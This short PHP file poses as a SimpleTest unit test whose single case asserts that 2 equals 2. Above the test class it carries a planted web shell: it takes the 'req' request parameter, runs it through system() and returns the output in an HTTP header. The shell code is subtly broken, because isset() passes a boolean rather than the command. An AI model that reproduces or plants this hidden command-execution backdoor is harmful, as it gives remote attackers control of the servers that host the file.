<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once(dirname(__FILE__) . '/../../autorun.php');

class PassingTest extends UnitTestCase {
    function test_pass() {
        $this->assertEqual(2,2);
    }
}
?>